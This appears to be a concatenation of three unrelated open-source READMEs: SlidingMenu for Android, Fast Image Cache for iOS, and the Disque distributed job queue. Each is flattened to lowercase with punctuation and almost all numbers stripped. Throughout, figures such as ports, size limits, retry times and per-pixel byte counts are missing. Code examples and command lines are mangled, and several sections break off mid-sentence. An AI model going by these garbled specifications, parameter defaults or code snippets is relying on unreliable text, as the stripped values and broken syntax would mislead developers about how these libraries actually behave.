4839957, slidingmenu play store demo   slidingmenu is an open source android library that allows developers to easily create applications with sliding menus like those made popular in the google and  youtube and facebook apps feel free to use it all you want in your android apps provided that you cite this project and include the license in your app slidingmenu is currently used in some awesome android apps here s a list of some of them foursquare  linkedin  zappos  rdio  evernote food  plume  vlc for android  espn scorecenter  mls matchday  gag  wunderlist   the verge  mtg familiar  mantano reader  falcon pro beta  mw barracks  if you are using slidingmenu in your app and would like to be listed here please let me know via twitter  also you can follow the project on twitter slidingmenu  in eclipse just import the library as an android library project project clean to generate the binaries you need like r java etc then just add slidingmenu as a dependency to your existing project and you re good to go setup with actionbarsherlock  setup as above checkout a clean copy of actionbarsherlock  and import into your eclipse workspace add actionbarsherlock as a dependency to slidingmenu go into the slidingactivities that you plan on using make them extend sherlockactivity instead of activity how to integrate this library into your projects  in order to integrate slidingmenu into your own projects you can do one of two things   you can wrap your activities in a slidingmenu by constructing it programmatically new slidingmenu context context and then calling slidingmenu attachtoactivity activity activity slidingmenu slidingwindow and slidingmenu slidingcontent slidingwindow will include the title and actionbar in the content section of the slidingmenu while slidingcontent does not you can check it out in the example app attachexample activity   you can embed the slidingmenu at the activity level by making your activity extend slidingactivity in your activity s oncreate method you will have to call setcontentview  as usual and also setbehindcontentview  which has the same syntax as setcontentview setbehindcontentview will place the view in the behind portion of the slidingmenu you will have access to the getslidingmenu method so you can customize the slidingmenu to your liking if you want to use another library such as actionbarsherlock you can just change the slidingactivities to extend the sherlockactivities instead of the regular activities   you can use the slidingmenu view directly in your xml layouts or programmatically in your java code this way you can treat slidingmenu as you would any other view type and put it in crazy awesome places like in the rows of a listview so many possibilities simple example public class slidingexample extends activity override public void oncreate bundle savedinstancestate super oncreate savedinstancestate settitle r string attach and and set the content view setcontentview r layout content and and configure the slidingmenu slidingmenu menu new slidingmenu this menu setmode slidingmenu left menu settouchmodeabove slidingmenu touchmodefullscreen menu setshadowwidthres r dimen

menu xml usage if you decide to use slidingmenu as a view you can define it in your xml layouts like this com jeremyfeinstein slidingmenu lib slidingmenu android id and id and slidingmenulayout

and yourshadowwidth sliding fadeenabled true and false sliding fadedegree float sliding selectorenabled true and false note you cannot use both behindoffset and behindwidth you will get an exception if you try viewabove a reference to the layout that you want to use as the above view of the slidingmenu viewbehind a reference to the layout that you want to use as the behind view of the slidingmenu touchmodeabove an enum that designates what part of the screen is touchable when the above view is showing margin means only the left margin fullscreen means the entire screen default is margin behindoffset a dimension representing the number of pixels that you want the above view to show when the behind view is showing default is  behindwidth a dimension representing the width of the behind view default is the width of the screen equivalent to behindoffset  behindscrollscale a float representing the relationship between the above view scrolling and the behind behind view scrolling if set to  f the behind view will scroll px for every px that the above view scrolls if set to  f the behind view will scroll px for every px that the above view scrolls and if set to  f the behind view will never scroll it will be static this one is fun to play around with default is  f shadowdrawable a reference to a drawable to be used as a drop shadow from the above view onto the below view default is no shadow for now shadowwidth a dimension representing the width of the shadow drawable default is  fadeenabled a boolean representing whether or not the behind view should fade when the slidingmenu is closing and un fade when opening fadedegree a float representing the amount of fade  f would mean fade all the way to black when the slidingmenu is closed  f would mean do not fade at all selectorenabled a boolean representing whether or not a selector should be drawn on the left side of the above view showing a selected view on the behind view selectordrawable a reference to a drawable to be used as the selector note in order to have the selector drawn you must call slidingmenu setselectedview view v with the selected view note that this will most likely not work with items in a listview because of the way that android recycles item views your layouts have to be based on a viewgroup unfortunatly this negates the merge optimisations  developed by  jeremy feinstein

unpredictable moving parts and the tests probably aren t that great either don t really know since i haven t touched this in ages i d recommend you to use the official bottomnavigationview from google and urge them to implement the features you need or use another rd party library cleaner code and better apis no more unnecessary stuff or spaghetti mess now the look feel and behavior is defined in

12283195, fast image cache is an efficient persistent and above all fast way to store and retrieve images in your ios application part of any good ios application s user experience is fast smooth scrolling and fast image cache helps make this easier stores images of similar sizes and styles together persists image data to disk returns images to the user significantly faster than traditional methods automatically manages cache expiry based on recency of usage utilizes a model based approach for storing and retrieving images allows images to be processed on a per model basis before being stored into the cache in order to understand how fast image cache works it s helpful to understand a typical scenario encountered by many applications that work with images ios applications especially those in the social networking space often have many images to display at once such as user photos the intuitive traditional approach is to request image data from an api process the original images to create the desired sizes and styles and store these processed images on the device later when an application needs to display these images they are loaded from disk into memory and displayed in an image view or are otherwise rendered to the screen it turns out that the process of going from compressed on disk image data to a rendered core animation layer that the user can actually see is very expensive as the number of images to be displayed increases this cost easily adds up to a noticeable degradation in frame rate and scrollable views further exacerbate the situation because content can change rapidly requiring fast processing time to maintain a smooth fps sup  and sup consider the workflow that occurs when loading an image from disk and displaying it on screen  on the next iteration of the main run loop core animation commits the implicit transaction which may involve creating a copy of any images which have been set as layer contents depending on the image copying it involves some or all of these steps sup  and sup  buffers are allocated to manage file io and decompression operations  the file data is read from disk into memory  the compressed image data is decoded into its uncompressed bitmap form which is typically a very cpu intensive operation sup  and sup  the uncompressed bitmap data is then used by core animation to render the layer these costs can easily accumulate and kill perceived application performance especially while scrolling users are presented with an unsatisfying user experience that is not in line with the the overall ios experience sup  and sup fps   s per frame  ms per frame this means that any main thread work that takes longer than ms will cause your application to drop animation frames sup  and sup as of ios  apple does not make their hardware jpeg decoder available for third party applications to use as a result only a slower software decoder is used for this step fast image cache minimizes or avoids entirely much of the work described above using a variety of techniques in order to avoid expensive image decompression operations image tables store uncompressed image data in their files if a source image is compressed it must first be decompressed for the image table to work with it this is a one time cost furthermore it is possible to utilize image format families working with image format families to perform this decompression exactly once for a collection of similar image formats there are obvious consequences to this approach however uncompressed image data requires more disk space and the difference between compressed and uncompressed file sizes can be significant especially for image formats like jpeg for this reason fast image cache works best with smaller images  although there is no api restriction that enforces this image tables are configured by image formats which specify among other things the maximum number of entries i e  individual images an image table can have this is to prevent the size of an image table file from growing arbitrarily image tables allocate  bytes per pixel so the maximum space occupied by an image table file can be determined as follows  bytes per pixel  image width in pixels  image height in pixels  maximum number of entries applications using fast image cache should carefully consider how many images each image table should contain when a new image is stored in an image table that is already full it will replace the least recently accessed image image table files are stored in the user s caches directory in a subdirectory called imagetables ios can remove cached files at any time to free up disk space so applications using fast image cache must be able to recreate any stored images and should not rely on image table files persisting forever note as a reminder data stored in a user s caches directory is not backed up to itunes or icloud fast image cache does not persist the original source images processed by entities to create the image data stored in its image tables for example if an original image is resized by an entity to create a thumbnail to be stored in an image table it is the application s responsibility to either persist the original image or be able to retrieve or recreate it again image format families can be specified to efficiently make use of a single source image see working with image format families working with image format families for more information in ios  apple introduced data protection when a user s device is locked or turned off the disk is encrypted files written to disk are protected by default although applications can manually specify the data protection mode for each file it manages with the advent of new background modes in ios  applications can now execute in the background briefly even while the device is locked as a result data protection can cause issues if applications attempt to access files that are encrypted fast image cache allows each image format to specify the data protection mode used when creating its backing image table file be aware that enabling data protection for image table files means that fast image cache might not be able to read or write image data from or to these files when the disk is encrypted fast image cache requires ios   or greater and relies on the following frameworks foundation core graphics note as of version   fast image cache does use arc the fastimagecachedemo xcode project requires xcode   or greater and is configured to deploy against ios   from the fastimagecache root directory copy the source files from the inner fastimagecache and fastimagecache subdirectory to your xcode project import ficimagecache h and fastimagecache and fastimagecache and fastimagecache and ficimagecache h wherever you use the image cache before the image cache can be used it needs to be configured this must occur each launch so the application delegate might be a good place to do this each image format corresponds to an image table that the image cache will use image formats that can use the same source image to render the images they store in their image tables should belong to the same image format family working with

particular entity and format name the entity is responsible for providing a url the url need not even point to an actual resource e g  the url might be constructed of a custom url scheme  but it must be a valid url the image cache uses these urls merely to keep track of which image requests are already in flight multiple requests to the image cache for the same image are handled correctly without any wasted effort the choice to use urls as a basis for keying image cache requests actually complements many real world application designs whereby urls to image resources rather than the images themselves are included with server provided model data note fast image cache does not provide any mechanism for making network requests this is the responsibility of the image cache s delegate finally once the source image is available the entity is asked to provide a drawing block the image table that will store the final image sets up a file mapped bitmap context and invokes the entity s

is made for an image that does not already exist in the image case the image cache does not block the calling thread until it has an image the retrieval method will immediately return no  and the

34676773, disque an in memory distributed job queue disque is an ongoing experiment to build a distributed in memory message its goal is to capture the essence of the redis as a jobs queue use case which is usually implemented using blocking list operations and move it into an ad hoc self contained scalable and fault tolerant design with simple to understand properties and guarantees but still resembling redis in terms of simplicity performance and implementation as a c non blocking networked server currently  jan  the project is in release candidate state people are encouraged to start evaluating it and report bugs and experiences warning this is beta code and may not be suitable for production usage the api is considered to be stable if not for details that may change in the next release candidates however it s new code so handle with care what is a message queue hint skip this section if you are familiar with message queues you know how humans use text messages to communicate right i could write my wife please get the milk at the store  and she maybe will reply ok message received i ll get two bottles on my way home a message queue is the same as human text messages but for computer programs for example a web application when an user subscribes may send another process that handles sending emails please send the confirmation email to tom example net message systems like disque allow communication between processes using different queues so a process can send a message to a queue with a given name and only processes which fetch messages from this queue will return those messages moreover multiple processes can listen for messages in a given queue and multiple processes can send messages to the same queue the important part of a message queue is to be able to provide guarantees so that messages are eventually delivered even in the face of failures so even if in theory implementing a message queue is very easy to write a very robust and scalable one is harder than it may appear give me the details disque is a distributed and fault tolerant message broker so it works as a middle layer among processes that want to exchange messages producers add messages that are served to consumers since message queues are often used in order to process delayed jobs disque often uses the term job in the api and in the documentation however jobs are actually just messages in the form of strings so disque can be used for other use cases in this documentation jobs and messages are used in an interchangeable way job queues with a producer consumer model are pretty common so the devil is in the details a few details about disque are disque is a synchronously replicated job queue by default when a new job is added it is replicated to w nodes before the client gets an acknowledgement about the job being added w  nodes can fail and the message will still be delivered disque supports both at least once and at most once delivery semantics at least once delivery semantics is where most effort was spent in the design and implementation while at most once semantics is a trivial result of using a retry time set to  which means never re queue the message again and a replication factor of  for the message not strictly needed but it is useless to have multiple copies of a message around if it will be delivered at most one time you can have at the same time both at least once and at most once jobs in the same queues and nodes since this is a per message setting disque at least once delivery is designed to approximate single delivery when possible even during certain kinds of failures this means that while disque can only guarantee a number of deliveries equal or greater to one it will try hard to avoid multiple deliveries whenever possible disque is a distributed system where all nodes have the same role aka it is multi master producers and consumers can attach to whatever node they like and there is no need for producers and consumers of the same queue to stay connected to the same node nodes will automatically exchange messages based on load and client requests disque is available it is an eventually consistent ap system in cap terms producers and consumers can make progress as long as a single node is reachable disque supports optional asynchronous commands that are low latency for the client but provide less guarantees for example a producer can add a job to a queue with a replication factor of  but may want to run away before knowing if the contacted node was really able to replicate it to the specified number of nodes or not the node will replicate the message in the background in a best effort way disque automatically re queues messages that are not acknowledged as already processed by consumers after a message specific retry time there is no need for consumers to re queue a message if it was not processed disque uses explicit acknowledges in order for a consumer to signal a message as delivered or using a different terminology to signal a job as already processed disque queues only provides best effort ordering each queue sorts messages based on the job creation time which is obtained using the wall clock of the local node where the message was created plus an incremental counter for messages created in the same millisecond  so messages created in the same node are normally delivered in the same order they were created this is not causal ordering since correct ordering is violated in different cases when messages are re issued because they are not acknowledged because of nodes local clock drifts and when messages are moved to other nodes for load balancing and federation in this case you end with queues having jobs originated in different nodes with different wall clocks however all this also means that normally messages are not delivered in random order and usually messages created first are delivered first note that since disque does not provide strict fifo semantics technically speaking it should not be called a message queue  and it could better identified as a message broker however i believe that at this point in the it industry a message queue is often more lightly used to identify a generic broker that may or may not be able to guarantee order in all cases given that we document the semantics very clearly i grant myself the right to call disque a message queue anyway disque provides the user with fine grained control for each job using three time related parameters  and one replication parameter for each job the user can control  the replication factor how many nodes have a copy  the delay time the min time disque will wait before putting the message in a queue making the message deliverable  the retry time how much time should elapse since the last time the job was queued and without an acknowledge about the job delivery before the job is re queued for delivery  the expire time how much time should elapse for the job to be deleted regardless of whether it was successfully delivered i e acknowledged or not finally disque supports optional disk persistence which is not enabled by default but that can be handy in single data center setups and during restarts other minor features are ability to block queues a few statistics about queue activity stateless iterators for queues and jobs commands to control the visibility of single jobs easy resize of the cluster adding nodes is trivial graceful removal of nodes without losing job replicas acks and retries disque s implementation of at least once delivery semantics is designed in order to avoid multiple delivery during certain classes of failures it is not able to guarantee that no multiple deliveries will occur however there are many at least once workloads where duplicated deliveries are acceptable or explicitly handled  but not desirable either a trivial example is sending emails to users it is not terrible if an user gets a duplicated email but is important to avoid it when possible  or doing idempotent operations that are expensive all the times where it is critical for performance to avoid multiple deliveries in order to avoid multiple deliveries when possible disque uses client acks when a consumer processes a message correctly it should acknowledge this fact to disque acks are replicated to multiple nodes and are garbage collected as soon as the system believes it is unlikely that more nodes in the cluster have the job the ack refers to still active under memory pressure or under certain failure scenarios acks are eventually discarded more explicitly  a job is replicated to multiple nodes but usually only queued in a single node there is a difference between having a job in memory and queueing it for delivery  nodes having a copy of a message if a certain amount of time has elapsed without getting the ack for the message will re queue it nodes will run a best effort protocol to avoid re queueing the message multiple times  acks are replicated and garbage collected across the cluster so that eventually processed messages are evicted this happens asap if there are no failures nor network partitions for example if a node having a copy of a job gets partitioned away during the time the job gets acknowledged by the consumer it is likely that when it returns in a reasonable amount of time that is before the retry time is reached it will be informed about the ack and will avoid to re queue the message similarly jobs can be acknowledged during a partition to just a single available node and when the partition heals the ack will be propagated to other nodes that may still have a copy of the message so an ack is just a proof of delivery that is replicated and retained for some time in order to make multiple deliveries less likely to happen in practice as already mentioned in order to control replication and retries a disque job has the following associated properties number of replicas delay retry and expire if a job has a retry time set to  it will get queued exactly once and in this case a replication factor greater than  is useless and signaled as an error to the user  so it will get delivered either a single time or will never get delivered while jobs can be persisted on disk for safety queues aren t so this behavior is guaranteed even when nodes restart after a crash whatever the persistence configuration is however when nodes are manually restarted by the sysadmin for example for upgrades queues are persisted correctly and reloaded at startup since the store and load operation is atomic in this case and there are no race conditions possible it is not possible that a job was delivered to a client and is persisted on disk as queued at the same time fast acknowledges disque supports a faster way to acknowledge processed messages via the fastack command the normal acknowledge is very expensive from the point of view of messages exchanged between nodes this is what happens during a normal acknowledge  the client sends ackjob to one node  the node sends a setack message to everybody it believes to have a copy  the receivers of setack reply with gotack to confirm  the node finally sends deljob to all the nodes note actual garbage collection is more complex in case of failures and is explained in the state machine later the above is what happens  of times if a message is replicated to  nodes acknowledging requires  and  and  and  messages for the sake of retaining the ack if some nodes may not be reached when the message is acknowledged this makes the probability of multiple deliveries of this message less likely however the alternative fast ack  while less reliable is much faster and invovles exchanging less messages this is how a fast acknowledge works  the client sends fastack to one node  the node evicts the job and sends a best effort deljob to all the nodes that may have a copy or to all the cluster if the node was not aware of the job if during a fast acknowledge a node having a copy of the message is not reachable for example because of a network partition the node will deliver the message again since it has a non acknowledged copy of the message and there is nobody able to inform it the message has been acknowledged when the partition heals if the network you are using is pretty reliable and you are very concerned with performance and multiple deliveries in the context of your applications are a non issue then fastack is probably the way to go dead letter queue many message queues implement a feature called dead letter queue it is a special queue used in order to accumulate messages that cannot be processed for some reason common causes could be  the message was delivered too many times but never correctly processed  the message time to live reached zero before it was processed  some worker explicitly asked the system to flag the message as having issues the idea is that the administrator of the system checks usually via automatic systems if there is something in the dead letter queue in order to understand if there is some software error or other kind of error preventing messages from being processed as expected since disque is an in memory system the message time to live is an important property when it is reached we want messages to go away since the ttl should be chosen so that after such a time it is no longer meaningful to process the message in such a system to use memory and create a queue in response to an error or to messages timing out looks like a non optimal idea moreover due to the distributed nature of disque dead letters could end up spawning multiple nodes and having duplicated entries in them so disque uses a different approach each node message representation has two counters a nacks counter and an additional deliveries counter the counters are not consistent among nodes having a copy of the same message they are just best effort counters that may not increment in some node during network partitions the idea of these two counters is that one is incremented every time a worker uses the nack command to tell the queue the message was not processed correctly and should be put back on the queue asap the other is incremented for every other condition different than the nack call that requires a message to be put back on the queue again this includes messages that get lost and are enqueued again or messages that are enqueued on one side of the partition since the message was processed on the other side and so forth using the getjob command with the withcounters option or using the show command to inspect a job it is possible to retrieve these two counters together with the other job information so if a worker before processing a message sees the counters have values over some application defined limit it can notify operations people in multiple ways  it may send an email  set a flag in a monitoring system  put the message in a special queue simulating the dead letter feature  attempt to process the message and report the stack trace of the error if any basically the exact handling of the feature is up to the application using disque note that the counters don t need to be consistent in the face of failures or network partitions the idea is that eventually if a message has issues the counters will get incremented enough times to reach the limit selected by the application as a warning threshold the reason for having two distinct counters is that applications may want to handle the case of explicit negative acknowledges via nack differently than multiple deliveries because of timeouts or messages getting lost disque and disk persistence disque can be operated in memory only using synchronous replication as a durability guarantee or can be operated using the append only file where jobs creations and evictions are logged on disk with configurable fsync policies and reloaded at restart aof is recommended especially if you run in a single availability zone where a mass reboot of all your nodes is possible normally disque only reloads job data in memory without populating queues since unacknowledged jobs are requeued eventually moreover reloading queue data is not safe in the case of at most once jobs having the retry value set to  however a special option is provided in order to reload the full state from the aof this is used together with an option that allows shutting down the server just after the aof is generated from scratch in order to make it safe even to reload jobs with retry set to  since the aof is generated while the server no longer accepts commands from clients so no race condition is possible even when running memory only disque is able to dump its memory on disk and reload from disk on controlled restarts for example in order to upgrade the software this is how to perform a controlled restart that works whether aof is enabled  config set aof enqueue jobs once yes  config rewrite  shutdown rewrite aof at this point we have a freshly generated aof on disk and the server is configured in order to load the full state only at the next restart aof enqueue jobs once is automatically turned off after the restart we can just restart the server with the new software or in a new server and it will restart with the full state note that aof enqueue jobs once implies loading the aof even if aof support is switched off so there is no need to enable aof just for the upgrade of an in memory only server disque jobs are uniquely identified by an id like the following d dcbcf ylnte and wsa and nqxscqi a job ids are composed of exactly  characters and start with the prefix d we can split an id into multiple parts d and dcbcf and ylnte and wsa and nqxscqi and a  d is the prefix  dcbcf is the first  bytes of the node id where the message was generated  ylnte and wsa and nqxscqi is the  bit id pseudo random part encoded in base  a is the job ttl in minutes because of it message ids can be expired safely even without having the job representation ids are returned by addjob when a job is successfully created are part of the getjob output and are used in order to acknowledge that a job was correctly processed by a worker part of the node id is included in the message so that a worker processing messages for a given queue can easily guess what are the nodes where jobs are created and move directly to these nodes to increase efficiency instead of listening for messages in a node that will require to fetch messages from other nodes only  bits of the original node id is included in the message however in a cluster with  disque nodes the probability of two nodes having identical  bit id prefixes is given by the birthday paradox p    in case of collisions the workers may just make a non efficient choice collisions in the  bits random part are believed to be impossible since it is computed as follows  bit id highbitsofsha seed and and counter seed is a seed generated via and dev and urandom at startup counter is a  bit counter incremented at every id generation so there are  possible ids selected in a uniform way while the probability of a collision is non zero mathematically in practice each id can be regarded as unique the encoded ttl in minutes has a special property it is always even for at most once jobs job retry value set to   and is always odd otherwise this changes the encoded ttl precision to  minutes but allows to tell if a job id is about a job with deliveries guarantees or not note that this fact does not mean that disque jobs ttls have a precision of two minutes the ttl field is only used to expire job ids of jobs a given node does not actually have a copy search dummy ack in this documentation for more information to play with disque please do the following  compile disque if you can compile redis you can compile disque it s the usual no external deps thing just type make binaries disque and disque server will end up in the src directory  run a few disque nodes on different ports create different disque conf files following the example disque conf in the source distribution please note that you need to open two tcp ports on each node  the base port of the disque instance for example  plus the cluster bus port which is always at a fixed offset obtained summing  to the base port so in the above example you need to open both  and  disque uses the base port to communicate with clients and the cluster bus port to communicate with other disque processes to run a node just call and disque server for example if you are running three disque servers in port    in order to join the cluster you should use the disque command line tool and run the following commands and disque p  cluster meet      and disque p  cluster meet      your cluster should now be ready you can try to add a job and fetch it back in order to test if everything is working and disque p       addjob queue body  d dcbcf ylnte and wsa and nqxscqi a      getjob from queue   queue  d dcbcf ylnte and wsa and nqxscqi a  body remember that you can add and get jobs from different nodes as disque is multi master also remember that you need to acknowledge jobs otherwise they ll never go away from the server memory unless the time to live is reached the disque api is composed of a small set of commands since the system solves a single very specific problem the three main commands are adds a job to the specified queue arguments are as follows queuename is the name of the queue any string basically you don t need to create queues if a queue does not exist it gets created automatically if one has no more jobs it gets removed job is a string representing the job disque is job meaning agnostic for it a job is just a message to deliver job max size is gb ms timeout is the command timeout in milliseconds if no async is specified and the replication level specified is not reached in the specified number of milliseconds the command returns with an error and the node does a best effort cleanup that is it will try to delete copies of the job across the cluster however the job may still be delivered later note that the actual timeout resolution is  and  of second or worse with the default server hz replicate count is the number of nodes the job should be replicated to delay sec is the number of seconds that should elapse before the job is queued by any server by default there is no delay retry sec period after which if no ack is received the job is put into the queue again for delivery if retry is  the job has at most once delivery semantics the default retry time is  minutes with the exception of jobs having a ttl so small that  of ttl is less than  minutes in this case the default retry is set to ttl and  with a minimum value of  second ttl sec is the max job life in seconds after this time the job is deleted even if it was not successfully delivered if not specified the default ttl is one day maxlen count specifies that if there are already count messages queued for the specified queue name the message is refused and an error reported to the client async asks the server to let the command return asap and replicate the job to other nodes in the background the job gets queued asap while normally the job is put into the queue only when the client gets a positive reply the command returns the job id of the added job assuming async is specified or if the job was replicated correctly to the specified number of nodes otherwise an error is returned return jobs available in one of the specified queues or return null if the timeout is reached a single job per call is returned unless a count greater than  is specified jobs are returned as a three element array containing the queue name the job id and the job body itself if jobs are available in multiple queues queues are processed left to right if there are no jobs for the specified queues the command blocks and messages are exchanged with other nodes in order to move messages about these queues to this node so that the client can be served nohang ask the command to not block even if there are no jobs in all the specified queues this way the caller can just check if there are available jobs without blocking at all withcounters return the best effort count of nacks negative acknowledges received by this job and the number of additional deliveries performed for this job see the dead letters section for more information acknowledges the execution of one or more jobs via job ids the node receiving the ack will replicate it to multiple nodes and will try to garbage collect both the job and the acks from the cluster so that memory can be freed a node receiving an ackjob command about a job id it does not know will create a special empty job with the state set to acknowledged  called a dummy ack the dummy ack is used in order to retain the acknolwedge during a netsplit if the ackjob is sent to a node that does not have a copy of the job when the partition heals job garbage collection will be attempted however since the job id encodes information about the job being an at most once or an at least once job the dummy ack is only created for at least once jobs performs a best effort cluster wide deletion of the specified job ids when the network is well connected and there are no node failures this is equivalent to ackjob but much faster due to less messages being exchanged  however during failures it is more likely that fast acknowledges will result in multiple deliveries of the same messages claims to be still working with the specified job and asks disque to postpone the next time it will deliver the job again the next delivery is postponed for the job retry time however the command works in a best effort way since there is no way to guarantee during failures that another node in a different network partition won t perform a delivery of the same job another limitation of the working command is that it cannot be sent to nodes not knowing about this particular job in such a case the command replies with a nojob error similarly if the job is already acknowledged an error is returned note that the working command is refused by disque nodes if  of the job time to live has already elapsed this limitation makes disque safer since usually the retry time is much smaller than the time to live of a job so it can t happen that a set of broken workers monopolize a job with working and never process it after  of the ttl has elapsed the job will be delivered to other workers anyway note that working returns the number of seconds you likely postponed the message visibility for other workers the command basically returns the retry time of the job  so the worker should make sure to send the next working command before this time elapses moreover a worker that may want to use this interface may fetch the retry value with the show command when starting to process a message or may simply send a working command asap like in the following example in pseudo code retry working jobid reset timer while work with the job still not finished if timer reached  of the retry time working jobid reset timer end the nack command tells disque to put the job back in the queue asap it is very similar to enqueue but it increments the job nacks counter instead of the additional deliveries counter the command should be used when the worker was not able to process a message and wants the message to be put back into the queue in order to be processed again other commands generic server information and stats returns hello format version this node id all the nodes ids ip addresses ports and priority lower is better means a node is more available clients should use this as a handshake command when connecting with a disque node return the length of the queue show information about a queue as an array of key value pairs below is an example of the output however implementations should not rely on the order of the fields nor on the existence of the fields listed they may be unlikely removed or more can be likely added in the future if a queue does not exist null is returned note that queues are automatically evicted after some time if empty and without clients blocked waiting for jobs even if there are active jobs for the queue so the non existence of a queue does not mean there are not jobs in the node or in the whole cluster about this queue the queue will be immediately created again when needed to serve requests example output qstat foo  name  foo  len  integer   age  integer   idle  integer   blocked  integer   import from   dcbcfffbbdffddceaed  bdfadcafdfffe  import rate  integer   jobs in  integer   jobs out  integer   pause  none most fields should be obvious the import from field shows a list of node ids this node is importing jobs from for this queue in order to serve clients requests the import rate is the instantaneous amount of jos and sec we import in order to handle our outgoing traffic getjob commands blocked is the number of clients blocked on this queue right now age and idle are reported in seconds the jobs in and out counters are incremented every time a job is enqueued or dequeued for any reason return without consuming from the queue count jobs if count is positive the specified number of jobs are returned from the oldest to the newest in the same best effort fifo order as getjob if count is negative the commands changes behavior and shows the count newest jobs from the newest from the oldest queue jobs if not already queued remove the job from the queue completely delete a job from a node note that this is similar to fastack  but limited to a single node since no deljob cluster bus message is sent to other nodes describe the job the command provides an interface to iterate all the existing queues in the local node providing a cursor in the form of an integer that is passed to the next command invocation during the first call the cursor must be  in the next calls the cursor returned in the previous call is used in the next the iterator guarantees to return all the elements but may return duplicated elements count count a hint about how much work to do per iteration busyloop block and return all the elements in a busy loop minlen count don t return elements with less than count jobs queued maxlen count don t return elements

cursor form of an unsigned number will be sensed as a valid the command provides an interface to iterate all the existing jobs in the local node providing a cursor in the form of an integer that is

is specified the full job state is returned like for the show command the cursor argument can be in any place the first non matching option that has valid cursor form of an unsigned number will be sensed as a valid control the paused state of a queue possibly broadcasting the command to other nodes in the cluster disque queues can be paused in both directions input and output or both pausing a queue makes it unavailable for input or output operations specifically a queue paused in input will have changed behavior in the following ways  addjob returns a paused error for queues paused in input  the node where the queue is paused no longer accepts to replicate jobs for this queue when requested by other nodes since addjob by default uses synchronous replication it means that if the queue is paused in enough nodes adding jobs with a specified level of replication may fail in general the node where the queue is paused will not create new jobs in the local node about this queue  the job no longer accepts enqueue messages from other nodes those messages are usually used by nodes in out of memory conditions that replicate jobs externally not holding a copy  in order to put the job in the queue of some random node among the nodes having a copy of a job  active jobs that reach their retry time are not put back into the queue instead their retry timer is updated and the node will try again later basically a queue paused in input never creates new jobs for this queue and never puts active jobs jobs for which the node has a copy but are not currently queued back in the queue for all the time the queue is paused a queue paused in output instead will behave in the following way  getjob will block even if there are jobs available in the specified queue instead of serving the jobs but getjob will unblock if the queue output pause is cleared later  the node will not provide jobs to other nodes in the context of node federation for paused queues so a queue paused in output will stop acting as a source of messages for both local and non local clients the paused state can be set for each queue using the pause command followed by options to specify how to change the paused state possible options are in pause the queue in input out pause the queue in output all pause the queue in input and output same as specifying both the in and out options none clear the paused state in input and output state just report the current queue state bcast send a pause command to all the reachable nodes of the cluster to set the same queue in the other nodes to the same state the command always returns the state of the queue after the execution of the specified options so the return value is one of in  out  all  none queues paused in input or output are never evicted to reclaim memory even if they are empty and inactive for a long time since otherwise the paused state would be forgotten for example in order to block output for the queue myqueue in all the currently reachable nodes the following command should be send to a single node pause myqueue out bcast to specify all is the same as to specify both in and out  so the two following forms are equivalent pause myqueue in out pause myqueue all to just get the current state use pause myqueue state none special handling of messages with retry set to  in order to provide a coherent api messages with at most once delivery semantics are still retained after being delivered a first time and should be acknowledged like any other message of course the acknowledge is not mandatory since the message may be lost and there is no way for the receiver to get the same message again since the message is associated with a retry value of  in order to avoid non acknowledged messages with retry set to  from leaking into disque and eating all the memory when the disque server memory is full and starts to evict it does not just evict acknowledged messages but also can evict non acknowledged messages having at the same time the following two properties  their retry is set to   the job was already delivered in theory acknowledging a job that will never be retried is a waste of time and resources however this design has hidden advantages  the api is exactly the same for all the kinds of jobs  after the job is delivered it is still possible to examine it observability is a very good property of messaging systems however not acknowledging the job does not result in big issues since they are evicted eventually during memory pressure adding and removing nodes at runtime adding nodes is trivial and just consists in starting a new node and sending it a cluster meet command assuming the node you just started is located at address     port  and a random you can use any node of the existing cluster is located at     port  all you need to do and disque h     p  cluster meet      note that you can invert the source and destination arguments and the new node will still join the cluster it does not matter if it s the old node to meet the new one or the other way around in order to remove a node it is possible to use the crude way of just shutting it down and then use cluster forget old node id in all the other nodes in order to remove references to it from the configuration of the other nodes however this means that for example messages that had a replication factor of  and one of the replicas was the node you are shutting down suddenly are left with just  replicas even if no actual failure happened moreover if the node you are removing had messages in queue you ll need to wait the retry time before the messages will be queued again for all these reasons disque has a better way to remove nodes which is described in the next section gracefully removal of nodes in order to empty a node of its content before removing it it is possible to use a feature that puts a node in leaving state to enable this feature just contact the node to remove and use the following command cluster leaving yes the node will start advertising itself as leaving  so in a matter of seconds all the cluster will know if there are partitions when the partition heals all the nodes will eventually be informed  and this is what happens when the node is in this state  when the node receives addjob commands it performs external replication like when a node is near the memory limits this means that it will make sure to create the number of replicas of the message in the cluster without using itself as a replica so no new messages are created in the context of a node which is leaving  the node starts to send leaving messages to all clients that use getjob but would block waiting for jobs the leaving error means the clients should connect to another node clients that were already blocked waiting for messages will be unblocked and a leaving error will be sent to them as well  the node no longer sends needjobs messages in the context of disque federation so it will never ask other nodes to transfer messages to it  the node and all the other nodes will advertise it with a bad priority in the hello command output so that clients will select a different node  the node will no longer create dummy acks in response to an ackjob command about a job it does not know all these behavior changes result in the node participating only as a source of messages so eventually its message count will drop to zero it is possible to check for this condition using info jobs when this happens the node can be stopped and removed from the other nodes tables using cluster forget as described in the section above client libraries disque uses the same protocol as redis itself to adapt redis clients or to use them directly should be pretty easy however note that disque s default port is  and not  while a vanilla redis client may work well with disque clients should optionally use the following protocol in order to connect with a disque cluster  the client should be given a number of ip addresses and ports where nodes are located the client should select random nodes and should try to connect until an available one is found  on a successful connection the hello command should be used in order to retrieve the node id and other potentially useful information server version number of nodes  if a consumer sees a high message rate received from foreign nodes it may optionally have logic in order to retrieve messages directly from the nodes where producers are producing the messages for a given topic the consumer can easily check the source of the messages by checking the node id prefix in the messages ids  the getjob command or other commands may return a leaving error instead of blocking this error should be considered by the client library as a request to connect to a different node since the node it is connected to is not able to serve the request since it is leaving the cluster nodes in this state have a very high priority number published via hello  so will be unlikely to be picked at the next connection attempt this way producers and consumers will eventually try to minimize node message exchanges whenever possible so basically you could perform basic usage using just a redis client however there are already specialized client libraries implementing a more specialized api on top of disque common lisp node js implementation details job replication strategy  disque tries to replicate to w  or w during out of memory reachable nodes shuffled  the cluster repljob message is used to replicate a job to multiple nodes the job is sent together with the list of nodes that may have a copy  if the required replication is not reached promptly the job is send to one additional node every  milliseconds when this happens a new repljob message is also re sent to each node that may already have a copy in order to refresh the list of nodes that have a copy  if the specified synchronous replication timeout is reached the node that originally received the addjob command from the client gives up and returns an error to the client when this happens the node performs a best effort procedure to delete the job from nodes that may have already received a copy of the job cluster topology disque is a full mesh with each node connected to each other disque performs distributed failure detection via gossip only in order to adjust the replication strategy try reachable nodes first when trying to replicate a message  and in order to inform clients about non reachable nodes when they want the list of nodes they can connect to as disque is multi master 